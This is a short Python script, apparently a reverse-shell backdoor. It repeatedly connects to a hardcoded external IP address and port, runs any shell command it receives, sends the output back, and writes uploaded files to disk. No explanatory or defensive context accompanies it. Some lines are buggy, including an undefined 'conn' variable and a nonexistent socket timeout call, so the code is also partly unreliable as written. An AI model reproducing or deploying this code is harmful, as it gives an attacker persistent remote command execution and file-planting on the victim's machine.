import socket
import subprocess
import time
while 1:
     try:
          ip="193.161.193.99"
          port=40139
          s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
          s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
          s.connect((ip,port))
          s.timeout(20)
          while True:
               command=s.recv(1024)
               command = command.decode()
               if command == 'exit':
                    s.close()
                    break
               elif command=='upload':
                    f_name = s.recv(10000)
                    f_size = s.recv(2000)
                    f_data = s.recv(int(f_size.decode())+1000)
                    with open(f_name.decode(),'wb') as f:
                              f.write(f_data)
               elif command in '                                                      ':
                    conn.send(('ERROR CMD...').encode())
               else:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output= proc.stdout.read()+proc.stderr.read()
                    data = output+'|-'.encode()
                    s.send(data)
     except:
          time.sleep(60)
